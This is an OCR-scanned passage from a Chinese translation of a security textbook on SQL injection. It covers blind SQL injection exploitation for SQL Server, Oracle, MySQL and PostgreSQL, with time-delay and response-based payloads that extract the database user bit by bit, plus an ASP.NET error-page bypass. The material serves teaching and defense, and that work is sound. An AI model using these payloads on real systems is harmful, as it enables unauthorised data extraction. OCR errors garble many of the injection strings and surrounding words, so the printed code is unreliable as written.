DELAY *00 : 00 : 05
读者可能已经注意到，这个页面请求并未包含一个结尾单引号。这是故意的，因为易受攻
击的查询提供了结尾单引号。还要考虑一点，我们选择提问的推断问题包含了尽可能少的解释：
我们并不是通过暂停5秒来确认我们不是sa。如果将问题颠倒过来，只有当登录用户不是sa
时才会产生延迟，这时如果出现快速的响应便可推断用户为sa，但也可能是因为服务器的负载
问题而导致该结果。反复测试并不断观察较长的时间可以增加推断的成功率，
可通过二分搜索方法或逐位方法来推断数据，考虑到之前已深入讲解了这些方法的基础技
术和理论，接下来我们将给出这两种方法的漏洞利用字符串。
1）通用的SQLServer二分搜索推断
下面是一个字符串注入点的例子（请注意，我们使用了堆叠查询，因面不需要UNION)：
′; IF ASCII (SUBSTRING((), /,1)) > kKAITFOR DELAY *00:00:05′;--
其中i是由单行子查询（..)返回的第i个字节，k是当前二分搜索的中间值。除了没有开头
的单引号外，数字注入点与字符串注入点完全相同：
; IF ASCII (SUBSTRING((**), /, 1)) > AWAITFOR DELAY *00:00:05′;-*
2)通用的SQLServer逐位推断
下面是一个字符串注入点的例子，使用了“按位与”，也可以替换为其他的位运算符。该
利用使用了堆叠查询，因而不需要UNION：
; IF ASCII (SUBSTRING((*), 7, 1))&2 /=2 ,WAITFOR DELAY *00:00:05′;-*
其中i是由子查询（.)返回的第i个字节，j是需要检查的位。除了没有开头的单引号外，
数字注入点与字符串注入点完全相同：
 IF ASCII (SUBSTRING((*") , /, 1) ) &2 /=2 WAITFOR DELAY *00:00:05′;-*
4.Oracle延迟
在Oracle 中，使用基于时间的 SQL 盲注的情况更棘手一些。虽然Oracle 中确实存在与
SLEEPO等价的内容，但由于SLEEPO的调用方式，Oracle 不支持在SELECT语句的 WHERE
子句中嵌入它。有很多SQL注入资源指向DBMS_LOCK包，这个包提供了SLEEPO函数和其
他函数。可使用下列语句调用它：
BEGIN DBMS_LOCK.SLEEP ( ) ; END;
其中n为执行中止的秒数。
这种方法存在很多约束。首先，不能将它嵌入到子查询中，因为它是PL/SQL代码而非SQL
代码：而且因为Oracle不支持堆叠查询，SLEEPO函数显得有点多余。其次，默认情况下除了
数据库管理员外，其他用户均无法使用DBMS_LOCK包：面且由于非特权用户通常习惯连接
到Oracle数据库(通常比在SQLServer中更常见），这使DBMS_LOCK更具争议。
如果注入点位于PL/SQL块中，可使用下列代码段来产生延迟：
206
---
## Page 221
第5章SQL盲注利用
IF (BITAND (ASCII (SUBSTR ( () ,  /,1)) , 2 ) =2 /) THEN DBMS_LOCK,SLEEP (5) ;
ENDIF :
其中i是由子查询（..）返回的第i个字节，j是需要检查的位。
Slavik Marchovic展示了使用DBMS_PIPE.RECEIVE_MESSAGE函数可以实现基于时间的
攻击i(http:/www.slaviks-blog.com/2009/10/13/blind-sqlinjection-in-oracle/)。默认情况下,该函数
被授权给public，并允许用户在从管道（pipe）读取时指定超时消息，由于它是一个函数，因此可
以将其嵌入到SQL查询中。在下面的例子中，如果连接数据库的用户是DBA，就暂停执行
5秒：
count_reviews.aspx?review_author=MadBob* OR 1 = CASE WHEN
SYS_CONTEXT (*USERENV′, *ISDBA*) =*TRUE′ THEN DBMS_PIPE. RECEIVE 
MESSAGE ('foo′, 5) ELSE 1 END -
也可以尝试Alonso提出的更复杂的查询方法。
5.3.2基于时间的推断应考虑的问题
前面我们已经学习了针对4种数据库的漏洞利用字符串。它们支持二分搜索和基于时间的
位提取推断技术。除此之外，我们还要对一些杂乱的细节进行讨论。我们已经将时间看作主要
的静态属性：其中一种状态请求完成得很快，另一种状态则完成得很慢，我们可依此推断状态
信息。但只有在保证了延迟的起因后，这种方法才会可靠，面现实中这种情况很少见。如果请
求花费了很长时间，有可能是由我们事先插入的延迟引起的，但高负载的数据库或信道拥挤同
样会引发慢的响应。可通过下面两种方法来部分地解决该问题：
1）将延迟设置得足够长，以消除其他可能因素的影响。如果RTT(Round Trip Time，平均
往返时间)为50毫秒，那么使用30秒作为延迟可提供很大的时间间隔，多数情况下能防止其
他延迟淹没推断所使用的延迟。遗的是，延迟的值取决于线路状态和数据库负载，它们是动
态的，很难测量，因面我们倾向于过度补偿，而这会导致数据检索效率很低。将延迟值设置得
太高还会带来触发数据库或Web应用框架超时异常的风险。
2）同时发送两个几乎完全相同的请求，它们均包含延迟产生子句，其中一个请求在位值
为0时产生延迟，另一个在位值为1时产生延迟。第一个请求返回的内容（接受正常的错误检
查可能是一个不会引发延迟的谓词，即使出现非确定延迟因素时也可以推断状态。该方法基
于如下假设：如果同时产生两个请求，那么这两个请求很可能会受到不可预测延迟的影响。
5.4，使用基于响应的技术
正如刚才使用请求时间推断特定字节的信息一样，我们还可以通过仔细检查响应中的数据
（包括内容和头)来推新状态。推断状态时，可以借助响应中包含的文本或在检查特定值时强制
产生的错误。例如，可以在推断中包含修改查询的逻辑：当检查的位为1时，查询返回结果：
为0时则不返回结果：或者当位为1时，强制产生错误，面为0时不产生错误。
虽然接下来要探讨产生错误的技术，但有必要提一下：我们力求产生的错误类型是应用程
序或数据库查询执行时产生的运行时错误，而非查询编译错误。如果查询的语法存在问题，那
么不管是什么推断问题都会产生错误。只有当推断的问题为真或为假时才应该产生错误，而不
207
---
## Page 222
SQL注入攻击与防御（第2版）
是不管真假都产生错误。
多数SQL盲注工具均使用基于响应的技术来推断信息，因为结果不会受不可控变量（比如
负载和线路拥挤）的影响。但该方法确实依赖于那些会返回部分响应的能被攻击者修改的注入
点。通过研究响应来推断信息时，可使用二分搜索方法或逐位方法。
5.4.1MySQL响应技术
请思考执行下列查询时的情形，其中Web应用接收输入数据MadBob，并从reviews表返
回一行，返回的数据包含在页面的响应中。该查询为：
SELECT COUNT (*) FROM reviews WHERE review_author=*MadBob*
执行结果仅返回单行数据，其中包含了MadBob所写评论的数量，查询结果显示在图5-6
所示的Web页面上。
Q
o m
图 5-6查的 MadBob 返回的计论数为 2,用作其推断
可通过向WHERE子句插入第二个谓词来将判断条件修改为查询是否返回结果。接下来可
通过检测查询是否返国了一行来推断信息位，使用的语句如下所示：
SELECT COUNT (*) FROM reviews WHERE reviev_author=*XadBob* AND
ASCII (SUBSTRING (user () ,  /,1) ) &2′=2² 
如果未返回结果，可以推断第i个字节的第j位为0，否则该位为1，如图5-7所示。其中
包含MadBob’amd if(ASCII(SUBSTRING（userO.1,1))>127,1.0)#字符串的查询产生了0条评论。
这是假状态，所以第一个字符的ASCII值小于127。
使用数字参数时，可以拆分、平衡输入。如果原始查询为：
SELECT COUNT (*) FROM reviews WHERE id=1
图5-7查询返回的评论数为0.是个假推断
当使用数值参数时，可以使用拆分与平衡技术。如果原始查询是：
208
---
## Page 223
第5章SQL盲注利用
SELECT COUNT(*) FROM revie￥s WHERE id= 1
逐位方法(bit-by-bit)的拆分与平衡注入字符串为：
SELECT COUNT (*) FROM reviews WHERE id=1+
if (ASCII (SUBSTRING (CURRENT_USER () , /,1)) 62′ 2” , 1, 0)
如果无法修改内容，可以使用另一种推断状态的方法：者到位值为1时强制产生数据库错
误，看到位值为0时则不产生错误。通过联合使用MySQL子查询和条件语句，可借助下列SQL
查询(实现了逐位推断方法）有选择地产生错误：
SELECT COUNT (*) FROM reviews WHERE
id=IF (ASCII (SUBSTRING (CURRENT_USER () , / , 1)) s2”=2” , (SELECT
table_name FROM information_schema.columns WHERE table_name =
(SELECT table_name FROM information_schema .columns) ) , 1) :
该方法相当紧资，有助于将查询拆分为多个部分。IFO语句处理条件分支，测试条件是
我们本章经常使用的ASCII(SUBSTRING（CURRENT_USEROi,1))&2=2，它实现了逐位推
断方法。如果条件为真（比如第j位为 1)，执行查询 SELECT table_name FROM information
schema.columns WHERE table_name(SELECT table_name FROM information_schema.columns)-
此外，如果第j位为0，那么IFO语句会返回1。IFO语句的真（true)分支使用内置的information_
schema.columns表，MySQL5.0及之后版本的所有数据库中均存在该表。
需要指出的是，使用以PHP编写并以MySQL作为数据存储的应用时，在数据库查询执行
过程中出现的错误不会产生引发通用错误页面的异常。调用页面必须检查mysq_qucryO是否返
回FALSE，或者mysql_crrorO是否返回一个非空字符串。只要有一个条件成立，页面就会打印
一个应用专用的错误消息。这样做的结果是，MySQL错误不会产生HTTP500响应代码，而是
产生正常的200响应代码。
5.4.2PostgreSQL响应技术
在PostgreSQL中，基于响应的攻击与在MySQL中类似。可以使用下面的语句，通过判断
该查询是否返回了一行数据来推断一个比特(bit)的信息：
SELECT COUNr (*) FROM zevievs KHERE review_author=*MadBob* AND
ASCII (SUBSTRING (user () , I , 1)) &2′ =2”-
如果没有返回结果，那么我们可以推断i字节的第j比特为0，否则该比特为1。
为了拆分和平衡数值输入，依赖于我们自定义的PAUSEO函数(本章之前已经讨论过）的查
询语句如下所示：
SELECT COUNT (*) FROM revie￥s WHERE id=1+ (SELECT CASE WHEN
(ASCII (SUBSTR (*, , 1) &2′ =2′) THEN PAUSE (1) ELSE 0 END) ; --
PAUSEO函数返回1，一个细微的扩展将修改该函数的定义以返回一个用户提供的值。
与MySQL类似，当无法修改内容时，通过有选择地强制使用除以0的条件，可以迫使数
据库产生错误。当条件为（..）时，下面的查询将产生一个错误，可以采用二分搜索方法或逐位
方法（bit-by-bit）来利用漏洞：
209
---
## Page 224
SQL注入攻击与防御（第2版）
SELECT CASE  (*") WHEN TRUE THEN 1/O END
很容易将它和拆分与平衡技术结合使用：
对错误的管理高度依赖于应用程序对错误的处理。例如，在安装的PHP中如果配置了
display_errors=On，它将显示来自数据库的错误消息（还受进一步配置参数的影响）。但也很可
能由页面来处理错误而不显示详细的错误信息：就这种盲注技术而言，只要可以观察到差异，
依然可以提取信息。
5.4.3SQLServer响应技术
请思考下列T-SQL查询语句，该语句可通过询问易受攻击的查询是否返回了行来推断1
位信息：
SELECT COUNT (*) FROM reviews WHERE review_author='MadBob′ and SYSTEM_
USER=' sa *
如果查询返回了结果，使用的登录用户为sa：如果未返回任何行，登录的为其他用户，可
以很容易地将该操作与二进制搜索和逐位方法集成起来以使提取真正的登录用户：
SELECT COUNT (*) FROM reviews WHERE review_author='MadBob′ AND
BASCII (SUBSTRING (SYSTEM_USER, /,1))> k --
或
SELECT COUNT (*) FROM reviews WHERE review_author='MadBob' AND
ASCII (SUBSTRING (SYSTEM_USER, 1 , 1) )&2′=2)
在SQLServer中，拆分与平衡技术可以与基于响应的推断技术很好地协同工作。结合一种
使用CASE的条件子查询，可以在搜索（取决于位或值的状态）中包含一个字符串。首先请思考
一个使用二分搜索的例子：
SELECT COUNT (*) FROM reviews WHERE review_author='Mad'+ (SELECT CASE
WHEN ASCII (SUBSTRING (SYSTEM_USER, 7,1))> kTHEN *Bob′ END) + **
下面是相应的使用逐位方法的例子：
SELECT COUNT (*) FROM revievs WHERE review_author='Mad'+ (SELECT CASE
WHEN ASCII(SUBSTRING (SYSTEM_USER, /,1) )&2′=2′ THEN *Bob′ END) + *
如果只有在搜索MadBob输入时，这两个查询才返回可见的结果，就说明在二分搜索推断
中，第i个字节的ASCII值要比k大，在逐位利用中第i个字节的第j位为1。
也可以强制产生一个数据库错误以防止页面在确实捕获到数据库错误时，未返回任何内
容，或者返回一个默认的错误页面或HTTP500页面。常见的一个例子是运行在IIS(Intemct信
息服务）6和7上的ASP.NET站点，它没有在web.config配置文件中包含标签设
如果向数据库提交一个受损的SQL查询，就会显示一个与图5-8相似的页面，深入研究返回
的HTTP头会发现，HTTP状态为500（参见图5-9)。错误页面未将自己包含到正常的基于错
210
---
## Page 225
第5章SQL盲注利用
误的提取方法中，因为它并未包括数据库错误消息。
000
Server Error in '/" Application.
Runtime Error
econfigureio
web.Cosf1g Corfigurat:ion F11e
figuratiotb
nfiyur
图5-8ASPNET中默认的异常页面
提示：
实际上，当ASP.NET应用程序使用web.config
HTTP/1.x 500 Inernal Server Emor
配置文件的标记定义的出错页面（error
Date: Iri, 09 Jan 2009 13 07:34 GMT
page)来捕获未处理的异常时，可以添加或修改
Server: Microsoft-IS/6.0
XAspNet-Version: 1.1.4322
XPoweredBy. ASP.NET
aspxerrorpage 参数，使其指向一个并不存在的页
面，这样就可以旁路(bypass）出错页面，因此，如
Cache-Control: grivate
Content-Type: text/hm);
ContentLength: 4709
charset=utt-8
果下面的请求在功能上重定向到一个用户自定义
的出错页面：
图5-9显示状态为500的响应头
下面的请求常常会泄漏它所捕获的底层错误：
count_reviews.aspx?review_author=MadBob*saspxerrorpath=/foo
引入错误有很多技巧。语法上不能存在错误，因为这会导致在执行查询之前总是失败，只